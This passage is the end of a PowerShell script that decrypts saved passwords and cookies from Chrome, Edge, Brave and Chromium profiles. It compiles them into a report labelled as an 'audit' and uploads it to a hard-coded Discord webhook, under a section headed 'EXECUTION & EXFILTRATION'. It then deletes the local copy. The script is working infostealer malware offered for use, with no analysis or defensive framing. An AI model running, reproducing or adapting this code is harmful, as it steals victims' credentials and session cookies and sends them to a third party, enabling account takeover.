                if ($Header -match "v10|v20") {
                    $Plain = DecryptWithAesGcm -Key $MasterKey -Iv $Raw[3..14] -Ciphertext $Raw[15..($Raw.Length - 17)] -Tag $Raw[($Raw.Length - 16)..($Raw.Length - 1)]
                    $AllLogins += [PSCustomObject]@{ Profile = $P.Name; Target = $L.URL; Username = $L.Username; Password = [Text.Encoding]::UTF8.GetString($Plain) }
                }
            } catch {}
        }

        # Decrypt Cookies
        foreach ($C in $RawCookies) {
            try {
                $Raw = $C.RawBlob
                $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
                if ($Header -match "v10|v20") {
                    $Plain = DecryptWithAesGcm -Key $MasterKey -Iv $Raw[3..14] -Ciphertext $Raw[15..($Raw.Length - 17)] -Tag $Raw[($Raw.Length - 16)..($Raw.Length - 1)]
                    $AllCookies += [PSCustomObject]@{ Profile = $P.Name; Host = $C.Host; Name = $C.Name; Value = [Text.Encoding]::UTF8.GetString($Plain); Path = $C.Path }
                }
            } catch {}
        }
    }

    return @{ Logins = $AllLogins; Cookies = $AllCookies }
}

# ======================================================================
# EXECUTION & EXFILTRATION
# ======================================================================

$Browsers = @("Chrome", "Edge", "Brave", "Chromium")
$FinalLogins = @()
$FinalCookies = @()

foreach ($B in $Browsers) {
    $Data = Invoke-PowerChrome -Browser $B
    if ($Data) {
        if ($Data.Logins) { $FinalLogins += $Data.Logins }
        if ($Data.Cookies) { $FinalCookies += $Data.Cookies }
    }
}

if ($FinalLogins.Count -gt 0 -or $FinalCookies.Count -gt 0) {
    $Report = New-Object System.Text.StringBuilder
    $HostName = $env:COMPUTERNAME
    $User = $env:USERNAME

    [void]$Report.AppendLine("🛡️ AUDIT REPORT FOR $HostName ($User)")
    [void]$Report.AppendLine("Generated: $(Get-Date)")
    [void]$Report.AppendLine("========================================`n")

    if ($FinalLogins.Count -gt 0) {
        [void]$Report.AppendLine("--- LOGIN CREDENTIALS ($($FinalLogins.Count)) ---")
        foreach ($L in $FinalLogins) {
            [void]$Report.AppendLine("[$($L.Profile)] URL: $($L.Target) | USER: $($L.Username) | PASS: $($L.Password)")
        }
    }

    if ($FinalCookies.Count -gt 0) {
        [void]$Report.AppendLine("`n--- BROWSER COOKIES ($($FinalCookies.Count)) ---")
        foreach ($C in $FinalCookies) {
            [void]$Report.AppendLine("[$($C.Profile)] HOST: $($C.Host) | NAME: $($C.Name) | VALUE: $($C.Value) | PATH: $($C.Path)")
        }
    }

    $TempFile = Join-Path $env:TEMP "Results_$($HostName).txt"
    $Report.ToString() | Out-File -FilePath $TempFile -Encoding utf8

    $Webhook = "https://discord.com/api/webhooks/1493893030439157881/QCtnE2iZqh52ccW3JRiWno55pzKqV3rR20SeETHwNLwLyLiVI7Cn28rZKGU2lZz_0Eep"
    $Payload = @{ content = "### 🛡️ Captured **$($FinalLogins.Count)** Logins & **$($FinalCookies.Count)** Cookies from **$HostName**" } | ConvertTo-Json
    
    try {
        if ($PSVersionTable.PSVersion.Major -ge 6) {
            Invoke-RestMethod -Uri $Webhook -Method Post -Form @{ payload_json = $Payload; file = Get-Item $TempFile }
        } else {
            Add-Type -AssemblyName System.Net.Http
            $Client = New-Object System.Net.Http.HttpClient
            $Content = New-Object System.Net.Http.MultipartFormDataContent
            $Content.Add((New-Object System.Net.Http.StringContent($Payload)), "payload_json")
            $FileBytes = [System.IO.File]::ReadAllBytes($TempFile)
            $Content.Add((New-Object System.Net.Http.ByteArrayContent($FileBytes)), "file", [System.IO.Path]::GetFileName($TempFile))
            [void]$Client.PostAsync($Webhook, $Content).Result
            $Client.Dispose()
        }
        Write-Host "Success!" -ForegroundColor Green
    } catch { Write-Host "Exfiltration failed!" } finally { Remove-Item $TempFile -Force -ErrorAction SilentlyContinue }
} else {
    Write-Host "No data found."
}
